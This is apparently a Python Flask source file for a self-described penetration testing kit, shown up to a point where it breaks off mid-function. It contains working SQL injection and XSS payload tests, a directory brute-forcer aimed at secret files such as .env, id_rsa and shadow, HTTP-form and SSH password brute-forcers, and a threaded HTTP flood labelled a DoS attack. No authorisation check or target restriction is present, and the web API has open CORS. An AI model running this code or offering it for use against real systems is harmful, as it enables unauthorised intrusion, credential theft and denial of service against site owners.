#!/usr/bin/env python3
"""
JAGUAR 45 CYBER KIT v4.0
REAL Penetration Testing Toolkit
Charlie Syllas & Jaguar 45 ©2026
"""

import os
import sys
import time
import json
import socket
import threading
import concurrent.futures
import hashlib
import base64
import re
import ipaddress
import random
import string
import subprocess
import urllib.parse
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from functools import wraps
from concurrent.futures import ThreadPoolExecutor, as_completed

# Third-party imports with error handling
try:
    import requests
    from requests.exceptions import RequestException, Timeout, ConnectionError as RequestsConnectionError
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("WARNING: 'requests' module not available. HTTP tools will be disabled.")

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# Flask imports
from flask import Flask, request, jsonify, render_template_string, Response
from flask_cors import CORS
import werkzeug.exceptions

# ==================== GLOBAL CONFIGURATION ====================
MAX_WORKERS = 50  # Global thread limit to prevent memory issues[citation:4]
GLOBAL_THREAD_POOL = ThreadPoolExecutor(max_workers=MAX_WORKERS)

REQUEST_TIMEOUT = 5  # seconds for HTTP requests
SOCKET_TIMEOUT = 2   # seconds for socket connections
SCAN_TIMEOUT = 30    # maximum seconds for any scan

# Service port mapping
SERVICE_PORTS = {
    20: 'FTP-Data', 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
    53: 'DNS', 67: 'DHCP', 68: 'DHCP', 69: 'TFTP', 80: 'HTTP',
    110: 'POP3', 123: 'NTP', 135: 'MSRPC', 139: 'NetBIOS',
    143: 'IMAP', 161: 'SNMP', 162: 'SNMP', 389: 'LDAP',
    443: 'HTTPS', 445: 'SMB', 465: 'SMTPS', 514: 'Syslog',
    587: 'SMTP', 636: 'LDAPS', 993: 'IMAPS', 995: 'POP3S',
    1080: 'SOCKS', 1433: 'MSSQL', 1521: 'Oracle', 1723: 'PPTP',
    1883: 'MQTT', 1900: 'UPnP', 2049: 'NFS', 2082: 'cPanel',
    2083: 'cPanel SSL', 2086: 'WHM', 2087: 'WHM SSL',
    2095: 'Webmail', 2096: 'Webmail SSL', 2181: 'ZooKeeper',
    2375: 'Docker', 2376: 'Docker SSL', 2628: 'DICT',
    3000: 'Node.js', 3306: 'MySQL', 3389: 'RDP',
    3690: 'SVN', 4333: 'mSQL', 4369: 'EPMD', 4789: 'Docker',
    5000: 'UPnP', 5432: 'PostgreSQL', 5672: 'AMQP',
    5900: 'VNC', 5938: 'TeamViewer', 5984: 'CouchDB',
    6379: 'Redis', 6443: 'Kubernetes', 6667: 'IRC',
    8000: 'HTTP-Alt', 8008: 'HTTP-Alt', 8080: 'HTTP-Proxy',
    8081: 'HTTP-Alt', 8443: 'HTTPS-Alt', 8888: 'HTTP-Alt',
    9000: 'PHP-FPM', 9001: 'Tor', 9042: 'Cassandra',
    9092: 'Kafka', 9100: 'PDL', 9200: 'Elasticsearch',
    9300: 'Elasticsearch', 9418: 'Git', 11211: 'Memcached',
    15672: 'RabbitMQ', 27017: 'MongoDB', 27018: 'MongoDB',
    28017: 'MongoDB HTTP', 50000: 'DB2', 50030: 'Hadoop',
    50070: 'Hadoop', 61616: 'ActiveMQ'
}

# ==================== CUSTOM EXCEPTIONS ====================
class ToolExecutionError(Exception):
    """Base exception for tool failures with JSON-serializable output."""
    def __init__(self, message: str, details: Any = None, status_code: int = 500):
        self.message = message
        self.details = details
        self.status_code = status_code
        super().__init__(self.message)

class ValidationError(ToolExecutionError):
    """Raised when user input validation fails."""
    def __init__(self, message: str, details: Any = None):
        super().__init__(message, details, status_code=400)

class NetworkError(ToolExecutionError):
    """Raised when network operations fail."""
    def __init__(self, message: str, details: Any = None):
        super().__init__(message, details, status_code=502)

# ==================== FLASK APPLICATION SETUP ====================
app = Flask(__name__)
CORS(app)
app.config['JSON_SORT_KEYS'] = False
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True

# Global state for tracking
class ScannerState:
    def __init__(self):
        self.active_scans: Dict[str, Dict] = {}
        self.scan_counter = 0
        self.vuln_counter = 0
        self.attack_counter = 0
        self.start_time = time.time()

    def generate_id(self, prefix: str) -> str:
        self.scan_counter += 1
        return f"{prefix}_{self.scan_counter}_{int(time.time())}"

    def register_scan(self, scan_id: str, scan_type: str, target: str):
        self.active_scans[scan_id] = {
            'type': scan_type,
            'target': target,
            'start_time': time.time(),
            'status': 'running'
        }

    def complete_scan(self, scan_id: str):
        if scan_id in self.active_scans:
            self.active_scans[scan_id]['status'] = 'completed'
            self.active_scans[scan_id]['end_time'] = time.time()

    def increment_vuln(self):
        self.vuln_counter += 1

    def increment_attack(self):
        self.attack_counter += 1

scanner_state = ScannerState()

# ==================== ERROR HANDLERS ====================
@app.errorhandler(werkzeug.exceptions.HTTPException)
def handle_http_exception(e: werkzeug.exceptions.HTTPException):
    """Return JSON for HTTP errors (404, 405, etc.).[citation:1][citation:5]"""
    response = {
        "status": "error",
        "error_type": "http_exception",
        "code": e.code,
        "name": e.name,
        "description": e.description
    }
    return jsonify(response), e.code

@app.errorhandler(ToolExecutionError)
def handle_tool_error(e: ToolExecutionError):
    """Handle our custom tool exceptions with consistent JSON."""
    response = {
        "status": "error",
        "error_type": "tool_execution",
        "message": e.message,
        "details": e.details
    }
    return jsonify(response), e.status_code

@app.errorhandler(ValidationError)
def handle_validation_error(e: ValidationError):
    """Handle validation errors."""
    response = {
        "status": "error",
        "error_type": "validation",
        "message": e.message,
        "details": e.details
    }
    return jsonify(response), e.status_code

@app.errorhandler(Exception)
def handle_generic_exception(e: Exception):
    """Catch-all for any unhandled exceptions.[citation:5]"""
    app.logger.error(f"Unhandled exception: {str(e)}", exc_info=True)
    response = {
        "status": "error",
        "error_type": "internal_error",
        "message": "An internal server error occurred",
        "details": str(e) if app.debug else None
    }
    return jsonify(response), 500

# ==================== DECORATORS & UTILITIES ====================
def validate_required_params(required_params: List[str]):
    """Decorator to validate required parameters in request JSON."""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            if not request.is_json:
                raise ValidationError("Request must be JSON", {"received": request.content_type})
            
            data = request.get_json()
            missing = [p for p in required_params if p not in data or data[p] is None or str(data[p]).strip() == ""]
            
            if missing:
                raise ValidationError(
                    "Missing required parameters",
                    {"missing": missing, "required": required_params}
                )
            return func(*args, **kwargs)
        return wrapper
    return decorator

def resolve_hostname(target: str) -> str:
    """Resolve hostname to IP with proper error handling."""
    try:
        # Check if it's already an IP
        try:
            ipaddress.ip_address(target)
            return target
        except ValueError:
            # It's a hostname, resolve it
            return socket.gethostbyname(target)
    except socket.gaierror as e:
        raise NetworkError(f"Cannot resolve hostname: {target}", {"error": str(e)})
    except Exception as e:
        raise NetworkError(f"Host resolution failed for {target}", {"error": str(e)})

def get_service_name(port: int) -> str:
    """Get service name for a port."""
    return SERVICE_PORTS.get(port, "Unknown")

def safe_request(url: str, method: str = "GET", **kwargs) -> requests.Response:
    """Make HTTP request with timeout and error handling."""
    if not REQUESTS_AVAILABLE:
        raise ToolExecutionError("HTTP requests module not available")
    
    timeout = kwargs.pop('timeout', REQUEST_TIMEOUT)
    verify = kwargs.pop('verify', False)
    
    try:
        if method.upper() == "GET":
            response = requests.get(url, timeout=timeout, verify=verify, **kwargs)
        elif method.upper() == "POST":
            response = requests.post(url, timeout=timeout, verify=verify, **kwargs)
        elif method.upper() == "HEAD":
            response = requests.head(url, timeout=timeout, verify=verify, **kwargs)
        else:
            raise ValidationError(f"Unsupported HTTP method: {method}")
        
        return response
    except Timeout:
        raise NetworkError(f"Request timed out after {timeout}s: {url}")
    except RequestsConnectionError:
        raise NetworkError(f"Cannot connect to: {url}")
    except RequestException as e:
        raise NetworkError(f"HTTP request failed: {str(e)}", {"url": url})

# ==================== TOOL IMPLEMENTATIONS ====================
# Each tool is implemented as a function with proper error handling

def tool_port_scan(target: str, scan_type: str = "quick", custom_range: str = "") -> Dict:
    """
    Real port scanner with multiple scan types.
    Returns consistent JSON structure.
    """
    scan_id = scanner_state.generate_id("portscan")
    scanner_state.register_scan(scan_id, "port_scan", target)
    
    try:
        start_time = time.time()
        ip = resolve_hostname(target)
        
        # Determine port range
        if scan_type == "quick":
            ports = list(SERVICE_PORTS.keys())[:100]  # Top 100 known ports
        elif scan_type == "common":
            ports = list(SERVICE_PORTS.keys())
        elif scan_type == "full":
            ports = list(range(1, 1001))
        elif scan_type == "custom" and custom_range:
            try:
                if '-' in custom_range:
                    start, end = map(int, custom_range.split('-'))
                    if end - start > 500:  # Safety limit
                        end = start + 500
                    ports = list(range(start, end + 1))
                else:
                    ports = [int(p.strip()) for p in custom_range.split(',')][:100]
            except ValueError:
                raise ValidationError("Invalid port range format. Use 'start-end' or 'port1,port2'")
        else:
            ports = list(range(1, 1025))  # Default to well-known ports
        
        open_ports = []
        
        def check_port(port: int) -> Optional[Dict]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(SOCKET_TIMEOUT)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    service = get_service_name(port)
                    return {"port": port, "service": service, "state": "open"}
            except:
                pass
            return None
        
        # Use the global thread pool with limits
        futures = []
        for port in ports[:300]:  # Limit for safety
            future = GLOBAL_THREAD_POOL.submit(check_port, port)
            futures.append(future)
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
        
        scan_time = round(time.time() - start_time, 2)
        
        scanner_state.complete_scan(scan_id)
        
        return {
            "status": "success",
            "scan_id": scan_id,
            "target": target,
            "ip": ip,
            "scan_type": scan_type,
            "scan_time": scan_time,
            "ports_scanned": len(ports),
            "open_ports": sorted(open_ports, key=lambda x: x["port"]),
            "open_count": len(open_ports)
        }
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"Port scan failed: {str(e)}")
        raise

def tool_directory_scan(url: str, wordlist_type: str = "common", custom_words: str = "") -> Dict:
    """Real directory/file bruteforce scanner."""
    scan_id = scanner_state.generate_id("dirscan")
    scanner_state.register_scan(scan_id, "directory_scan", url)
    
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Parse URL to ensure it's valid
        parsed = urllib.parse.urlparse(url)
        if not parsed.netloc:
            raise ValidationError("Invalid URL format")
        
        # Wordlist selection
        base_wordlist = [
            'admin', 'login', 'dashboard', 'panel', 'wp-admin', 'administrator',
            'api', 'test', 'backup', 'config', 'data', 'db', 'secret', 'private',
            'cgi-bin', 'robots.txt', '.git', '.env', 'config.php', 'wp-config.php',
            'phpinfo.php', 'test.php', 'index.php', 'index.html', 'backup.zip',
            'dump.sql', 'database.sql', 'backup.tar', 'logs', 'temp', 'tmp'
        ]
        
        if wordlist_type == "large":
            base_wordlist += [
                'server-status', 'phpmyadmin', 'mysql', 'phpMyAdmin', 'pma',
                'myadmin', '.htaccess', '.htpasswd', 'web.config', 'web.xml',
                'setup', 'install', 'update', 'upgrade', 'cron', 'crontab',
                'bash_history', '.bashrc', '.profile', '.ssh', 'id_rsa',
                'id_dsa', 'authorized_keys', 'known_hosts', 'passwd', 'shadow',
                'group', 'hosts', 'services', 'protocols', 'networks'
            ]
        elif wordlist_type == "custom" and custom_words:
            custom_list = [w.strip() for w in custom_words.split('\n') if w.strip()]
            base_wordlist = custom_list[:200]  # Limit custom entries
        
        # Add extensions
        extensions = ['', '.php', '.html', '.txt', '.bak', '.old', '.tar', '.zip', '.sql', '.json']
        wordlist = []
        for word in base_wordlist[:100]:  # Limit total words
            for ext in extensions:
                wordlist.append(word + ext)
        
        found = []
        
        def check_path(path: str):
            try:
                test_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
                response = safe_request(test_url, timeout=2)
                
                if response.status_code < 400:
                    found.append({
                        'path': path,
                        'url': test_url,
                        'status': response.status_code,
                        'size': len(response.content),
                        'headers': dict(response.headers)
                    })
            except (ToolExecutionError, NetworkError):
                pass
        
        # Threaded scanning
        futures = []
        for path in wordlist:
            future = GLOBAL_THREAD_POOL.submit(check_path, path)
            futures.append(future)
        
        for future in as_completed(futures):
            pass  # Results collected in found list
        
        scanner_state.complete_scan(scan_id)
        
        return {
            "status": "success",
            "scan_id": scan_id,
            "target": url,
            "found": found,
            "total_found": len(found),
            "wordlist_size": len(wordlist)
        }
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"Directory scan failed: {str(e)}")
        raise

def tool_sql_injection(url: str, method: str = "error") -> Dict:
    """Real SQL injection testing with multiple techniques."""
    scan_id = scanner_state.generate_id("sqli")
    scanner_state.register_scan(scan_id, "sql_injection", url)
    
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            raise ValidationError("URL must have query parameters to test")
        
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            raise ValidationError("No parameters found in URL")
        
        test_payloads = []
        
        if method == "error":
            test_payloads = [
                "'", "\"", "1'", "1\"",
                "1' OR '1'='1", "1' OR '1'='2",
                "' OR '1'='1", "' OR '1'='2",
                "1' OR '1'='1' --", "1' OR '1'='1' #",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"
            ]
        elif method == "boolean":
            test_payloads = [
                "1' AND '1'='1", "1' AND '1'='2",
                "1' OR '1'='1", "1' OR '1'='2"
            ]
        elif method == "time":
            test_payloads = [
                "1' AND SLEEP(5)--", "1' OR SLEEP(5)--",
                "1' AND BENCHMARK(10000000,MD5('test'))--"
            ]
        else:
            test_payloads = ["'", "\"", "1' OR '1'='1"]
        
        vulnerable = False
        working_payload = None
        param_name = None
        payloads_tested = 0
        
        error_indicators = [
            'sql', 'syntax', 'mysql', 'postgresql', 'oracle',
            'database', 'query failed', 'sqlite', 'odbc', 'driver',
            'invalid query', 'unclosed quotation', 'you have an error'
        ]
        
        for param, values in params.items():
            original_value = values[0]
            
            for payload in test_payloads:
                payloads_tested += 1
                # Replace parameter value with payload
                test_url = url.replace(
                    f"{param}={original_value}",
                    f"{param}={payload}"
                )
                
                try:
                    start_time = time.time()
                    response = safe_request(test_url, timeout=5)
                    response_time = time.time() - start_time
                    
                    # Check for error-based indicators
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        vulnerable = True
                        working_payload = payload
                        param_name = param
                        break
                    
                    # Check for time-based
                    if method == "time" and response_time > 4:
                        vulnerable = True
                        working_payload = payload
                        param_name = param
                        break
                    
                    # Check for boolean-based (simple length check)
                    if method == "boolean":
                        orig_response = safe_request(url, timeout=5)
                        if len(response.content) != len(orig_response.content):
                            vulnerable = True
                            working_payload = payload
                            param_name = param
                            break
                            
                except (ToolExecutionError, NetworkError):
                    continue
            
            if vulnerable:
                break
        
        scanner_state.complete_scan(scan_id)
        
        result = {
            "status": "success",
            "scan_id": scan_id,
            "target": url,
            "method": method,
            "vulnerable": vulnerable,
            "payloads_tested": payloads_tested
        }
        
        if vulnerable:
            result.update({
                "working_payload": working_payload,
                "vulnerable_parameter": param_name,
                "severity": "critical"
            })
            scanner_state.increment_vuln()
        
        return result
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"SQL injection test failed: {str(e)}")
        raise

def tool_xss_scan(url: str) -> Dict:
    """Real XSS vulnerability scanner."""
    scan_id = scanner_state.generate_id("xss")
    scanner_state.register_scan(scan_id, "xss_scan", url)
    
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            raise ValidationError("URL must have query parameters to test")
        
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            raise ValidationError("No parameters found in URL")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        vulnerable = False
        working_payload = None
        param_name = None
        
        for param, values in params.items():
            original_value = values[0]
            
            for payload in xss_payloads:
                test_url = url.replace(
                    f"{param}={original_value}",
                    f"{param}={payload}"
                )
                
                try:
                    response = safe_request(test_url, timeout=5)
                    
                    # Check if payload appears in response (reflected XSS)
                    if payload in response.text:
                        vulnerable = True
                        working_payload = payload
                        param_name = param
                        break
                        
                    # Check for DOM-based indicators
                    if 'alert(' in response.text or 'onerror=' in response.text or 'onload=' in response.text:
                        vulnerable = True
                        working_payload = payload
                        param_name = param
                        break
                        
                except (ToolExecutionError, NetworkError):
                    continue
            
            if vulnerable:
                break
        
        scanner_state.complete_scan(scan_id)
        
        result = {
            "status": "success",
            "scan_id": scan_id,
            "target": url,
            "vulnerable": vulnerable
        }
        
        if vulnerable:
            result.update({
                "working_payload": working_payload,
                "vulnerable_parameter": param_name,
                "severity": "high"
            })
            scanner_state.increment_vuln()
        
        return result
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"XSS scan failed: {str(e)}")
        raise

def tool_subdomain_scan(domain: str) -> Dict:
    """Real subdomain enumeration."""
    scan_id = scanner_state.generate_id("subdomain")
    scanner_state.register_scan(scan_id, "subdomain_scan", domain)
    
    try:
        if not DNS_AVAILABLE:
            raise ToolExecutionError("DNS module not available for subdomain scanning")
        
        subdomains = []
        common_subs = [
            'www', 'mail', 'ftp', 'smtp', 'pop', 'imap', 'webmail',
            'admin', 'administrator', 'dashboard', 'panel', 'control',
            'blog', 'news', 'forum', 'forums', 'community',
            'api', 'api2', 'api3', 'rest', 'graphql',
            'dev', 'development', 'test', 'testing', 'staging', 'stage',
            'secure', 'security', 'vpn', 'ssh', 'remote',
            'cpanel', 'whm', 'webdisk', 'plesk',
            'ns1', 'ns2', 'ns3', 'ns4', 'dns', 'dns1', 'dns2',
            'mx', 'mx1', 'mx2', 'mail1', 'mail2',
            'static', 'cdn', 'assets', 'media', 'images', 'img',
            'app', 'apps', 'application', 'mobile', 'm',
            'shop', 'store', 'cart', 'checkout', 'pay',
            'support', 'help', 'faq', 'docs', 'documentation',
            'status', 'monitor', 'monitoring', 'stats', 'analytics'
        ]
        
        resolver = dns.resolver.Resolver()
        resolver.timeout = 2
        resolver.lifetime = 2
        
        def check_subdomain(sub: str) -> Optional[str]:
            try:
                full_domain = f"{sub}.{domain}"
                answers = resolver.resolve(full_domain, 'A')
                if answers:
                    return full_domain
            except:
                pass
            return None
        
        # Threaded DNS resolution
        futures = []
        for sub in common_subs:
            future = GLOBAL_THREAD_POOL.submit(check_subdomain, sub)
            futures.append(future)
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                subdomains.append(result)
        
        # Also try some numeric patterns
        for i in range(1, 5):
            test_sub = f"server{i}"
            future = GLOBAL_THREAD_POOL.submit(check_subdomain, test_sub)
            futures.append(future)
        
        for future in as_completed(futures):
            result = future.result()
            if result and result not in subdomains:
                subdomains.append(result)
        
        scanner_state.complete_scan(scan_id)
        
        return {
            "status": "success",
            "scan_id": scan_id,
            "domain": domain,
            "subdomains": sorted(subdomains),
            "total_found": len(subdomains)
        }
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"Subdomain scan failed: {str(e)}")
        raise

def tool_bruteforce_login(target: str, username_field: str, password_field: str,
                          usernames: List[str], passwords: List[str]) -> Dict:
    """Real login form bruteforce."""
    scan_id = scanner_state.generate_id("bruteforce")
    scanner_state.register_scan(scan_id, "bruteforce", target)
    scanner_state.increment_attack()
    
    try:
        if not REQUESTS_AVAILABLE:
            raise ToolExecutionError("HTTP requests module not available")
        
        # Validate inputs
        if not target.startswith(('http://', 'https://')):
            raise ValidationError("Target must be a valid URL")
        
        if not usernames or not passwords:
            raise ValidationError("Usernames and passwords lists cannot be empty")
        
        # Limit attempts for safety
        usernames = usernames[:10]
        passwords = passwords[:10]
        
        found = None
        attempts = 0
        
        # First, check if the login page exists
        try:
            response = safe_request(target, timeout=5)
            if response.status_code != 200:
                raise NetworkError(f"Login page not accessible (HTTP {response.status_code})")
        except (ToolExecutionError, NetworkError) as e:
            raise NetworkError(f"Cannot access login page: {str(e)}")
        
        for username in usernames:
            for password in passwords:
                attempts += 1
                
                try:
                    # Prepare POST data
                    data = {
                        username_field: username,
                        password_field: password
                    }
                    
                    # Send login request with minimal headers
                    headers = {
                        'User-Agent': 'Jaguar45-Scanner/1.0',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                    
                    response = safe_request(target, method="POST", data=data, 
                                           headers=headers, timeout=5, allow_redirects=False)
                    
                    # Check for successful login indicators
                    if response.status_code in [301, 302, 303]:  # Redirect on success
                        found = {"username": username, "password": password}
                        break
                    
                    # Check for success keywords in response
                    success_indicators = ['welcome', 'dashboard', 'logout', 'success', 'profile']
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        found = {"username": username, "password": password}
                        break
                    
                    # Check for session cookie
                    if 'session' in response.headers.get('Set-Cookie', '').lower():
                        found = {"username": username, "password": password}
                        break
                        
                except (ToolExecutionError, NetworkError):
                    continue
            
            if found:
                break
        
        scanner_state.complete_scan(scan_id)
        
        result = {
            "status": "success",
            "scan_id": scan_id,
            "target": target,
            "attempts": attempts,
            "credentials_found": found is not None
        }
        
        if found:
            result["credentials"] = found
        
        return result
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"Bruteforce attack failed: {str(e)}")
        raise

def tool_ssh_bruteforce(target: str, usernames: List[str], passwords: List[str]) -> Dict:
    """Real SSH bruteforce using paramiko."""
    scan_id = scanner_state.generate_id("sshbrute")
    scanner_state.register_scan(scan_id, "ssh_bruteforce", target)
    scanner_state.increment_attack()
    
    try:
        if not PARAMIKO_AVAILABLE:
            raise ToolExecutionError("SSH module (paramiko) not available")
        
        # Parse host:port
        if ':' in target:
            host, port_str = target.split(':')
            port = int(port_str)
        else:
            host = target
            port = 22
        
        # Validate host
        try:
            ip = resolve_hostname(host)
        except NetworkError:
            ip = host
        
        # Limit attempts
        usernames = usernames[:5]
        passwords = passwords[:5]
        
        found = None
        attempts = 0
        
        for username in usernames:
            for password in passwords:
                attempts += 1
                
                try:
                    # Create SSH client
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # Try to connect
                    ssh.connect(hostname=ip, port=port, username=username, 
                               password=password, timeout=5, banner_timeout=5)
                    
                    # If connection succeeds, credentials are valid
                    found = {"username": username, "password": password}
                    ssh.close()
                    break
                    
                except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
                    continue
                except Exception as e:
                    # Other errors (network, etc.)
                    continue
            
            if found:
                break
        
        scanner_state.complete_scan(scan_id)
        
        result = {
            "status": "success",
            "scan_id": scan_id,
            "target": target,
            "host": ip,
            "port": port,
            "attempts": attempts,
            "credentials_found": found is not None
        }
        
        if found:
            result["credentials"] = found
        
        return result
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"SSH bruteforce failed: {str(e)}")
        raise

def tool_dos_attack(target: str, attack_type: str = "http", 
                   threads: int = 50, duration: int = 10) -> Dict:
    """Controlled DoS simulation for testing."""
    scan_id = scanner_state.generate_id("dos")
    scanner_state.register_scan(scan_id, "dos_attack", target)
    scanner_state.increment_attack()
    
    try:
        if not REQUESTS_AVAILABLE:
            raise ToolExecutionError("HTTP requests module not available")
        
        # Validate inputs
        if not target.startswith(('http://', 'https://')):
            raise ValidationError("Target must be a valid URL")
        
        threads = max(1, min(threads, 100))  # Limit threads
        duration = max(1, min(duration, 30))  # Limit duration
        
        # Check if target is accessible
        try:
            response = safe_request(target, timeout=5)
            if response.status_code >= 400:
                raise NetworkError(f"Target returns error: HTTP {response.status_code}")
        except (ToolExecutionError, NetworkError) as e:
            raise NetworkError(f"Cannot access target: {str(e)}")
        
        attack_id = f"dos_{int(time.time())}_{random.randint(1000, 9999)}"
        requests_sent = 0
        start_time = time.time()
        end_time = start_time + duration
        
        def http_flood_worker():
            nonlocal requests_sent
            while time.time() < end_time and attack_id in scanner_state.active_scans:
                try:
                    safe_request(target, timeout=1)
                    requests_sent += 1
                except:
                    pass
        
        # Start worker threads
        worker_threads = []
        for _ in range(threads):
            t = threading.Thread(target=http_flood_worker)
            t.daemon = True
            t.start()
            worker_threads.append(t)
        
        # Wait for duration
        time.sleep(duration)
        
        scanner_state.complete_scan(scan_id)
        
        return {
            "status": "success",
            "scan_id": scan_id,
            "attack_id": attack_id,
            "target": target,
            "attack_type": attack_type,
            "duration": duration,
            "threads": threads,
            "requests_sent": requests_sent,
            "requests_per_second": round(requests_sent / duration, 2) if duration > 0 else 0
        }
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"DoS attack failed: {str(e)}")
        raise

def tool_hash_generator(text: str) -> Dict:
    """Generate multiple hashes from input text."""
    try:
        if not text or len(text.strip()) == 0:
            raise ValidationError("Input text cannot be empty")
        
        hashes = {
            "md5": hashlib.md5(text.encode()).hexdigest(),
            "sha1": hashlib.sha1(text.encode()).hexdigest(),
            "sha256": hashlib.sha256(text.encode()).hexdigest(),
            "sha512": hashlib.sha512(text.encode()).hexdigest(),
            "sha3_256": hashlib.sha3_256(text.encode()).hexdigest(),
            "sha3_512": hashlib.sha3_512(text.encode()).hexdigest(),
            "blake2s": hashlib.blake2s(text.encode()).hexdigest(),
            "blake2b": hashlib.blake2b(text.encode()).hexdigest(),
            "base64": base64.b64encode(text.encode()).decode('utf-8')
        }
        
        return {
            "status": "success",
            "input": text,
            "hashes": hashes
        }
        
    except Exception as e:
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"Hash generation failed: {str(e)}")
        raise

# ==================== NEW TOOLS ADDED ====================
def tool_cms_detection(url: str) -> Dict:
    """Detect CMS and technologies on a website."""
    scan_id = scanner_state.generate_id("cmsdetect")
    scanner_state.register_scan(scan_id, "cms_detection", url)
    
    try:
        response = safe_request(url, timeout=5)
        html = response.text
        headers = response.headers
        
        technologies = []
        
        # Check headers
        server = headers.get('Server', '')
        if server:
            technologies.append(f"Server: {server}")
        
        powered_by = headers.get('X-Powered-By', '')
        if powered_by:
            technologies.append(f"Powered By: {powered_by}")
        
        # CMS detection
        cms_indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress', '/wp-admin/'],
            'Joomla': ['joomla', 'Joomla!', '/media/jui/', '/media/system/'],
            'Drupal': ['drupal', 'Drupal.settings', 'sites/all/'],
            'Magento': ['magento', 'Mage.Cookies', '/skin/frontend/'],
            'Shopify': ['shopify', 'cdn.shopify.com'],
            'Wix': ['wix.com', 'static.parastorage.com'],
            'Squarespace': ['squarespace', 'static1.squarespace.com'],
            'Ghost': ['ghost', 'ghost.org'],
            'Blogger': ['blogger', 'blogspot.com'],
            'MediaWiki': ['mediawiki', '/wiki/']
        }
        
        detected_cms = []
        for cms, indicators in cms_indicators.items():
            for indicator in indicators:
                if indicator.lower() in html.lower():
                    detected_cms.append(cms)
                    break
        
        # Framework detection
        framework_indicators = {
            'React': ['react', 'React.createElement'],
            'Angular': ['angular', 'ng-'],
            'Vue.js': ['vue', 'Vue.component'],
            'jQuery': ['jquery', 'jQuery'],
            'Bootstrap': ['bootstrap', 'btn-primary'],
            'Laravel': ['laravel', 'csrf-token'],
            'Django': ['django', 'csrfmiddlewaretoken'],
            'Ruby on Rails': ['rails', 'csrf-token'],
            'Express.js': ['express', 'X-Powered-By: Express'],
            'ASP.NET': ['asp.net', '__VIEWSTATE']
        }
        
        detected_frameworks = []
        for framework, indicators in framework_indicators.items():
            for indicator in indicators:
                if indicator.lower() in html.lower() or indicator in str(headers):
                    detected_frameworks.append(framework)
                    break
        
        scanner_state.complete_scan(scan_id)
        
        return {
            "status": "success",
            "scan_id": scan_id,
            "url": url,
            "technologies": technologies,
            "cms": list(set(detected_cms)),
            "frameworks": list(set(detected_frameworks)),
            "headers_count": len(headers),
            "html_size": len(html)
        }
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"CMS detection failed: {str(e)}")
        raise

def tool_header_analysis(url: str) -> Dict:
    """Analyze HTTP headers for security issues."""
    scan_id = scanner_state.generate_id("headers")
    scanner_state.register_scan(scan_id, "header_analysis", url)
    
    try:
        response = safe_request(url, timeout=5)
        headers = dict(response.headers)
        
        security_headers = [
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'X-XSS-Protection',
            'Referrer-Policy',
            'Permissions-Policy',
            'X-Permitted-Cross-Domain-Policies'
        ]
        
        missing_security = []
        present_security = {}
        
        for header in security_headers:
            if header in headers:
                present_security[header] = headers[header]
            else:
                missing_security.append(header)
        
        # Check for dangerous headers
        dangerous_headers = [
            'Server',
            'X-Powered-By',
            'X-AspNet-Version',
            'X-AspNetMvc-Version'
        ]
        
        exposed_info = {}
        for header in dangerous_headers:
            if header in headers:
                exposed_info[header] = headers[header]
        
        scanner_state.complete_scan(scan_id)
        
        return {
            "status": "success",
            "scan_id": scan_id,
            "url": url,
            "status_code": response.status_code,
            "total_headers": len(headers),
            "security_headers_present": present_security,
            "security_headers_missing": missing_security,
            "exposed_information": exposed_info,
            "all_headers": headers
